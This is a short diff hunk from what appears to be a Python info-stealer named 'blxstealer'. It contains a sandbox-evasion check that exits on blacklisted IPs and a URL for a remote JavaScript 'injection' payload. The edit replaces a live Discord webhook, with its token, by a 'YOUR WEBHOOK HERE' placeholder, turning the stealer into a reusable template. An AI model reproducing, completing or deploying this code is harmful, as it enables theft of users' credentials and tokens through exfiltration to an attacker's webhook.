@@ -51,7 +51,7 @@ ip = subprocess.check_output('curl ifconfig.me', shell=True).decode('utf-8').str
 if ip in sblacklist:
     exit()
 
-hook = "https://discord.com/api/webhooks/1116033656364998726/4IvCyGfh4ls9N0xRFL6e-_bXsn8lBJfdgY3yrxxnrDKjvnwwR5zBLXuaXQ7Gk9IukSIF"
+hook = "YOUR WEBHOOK HERE"
 inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/main/index.js"
 color =  0x812118
 DETECTED = False
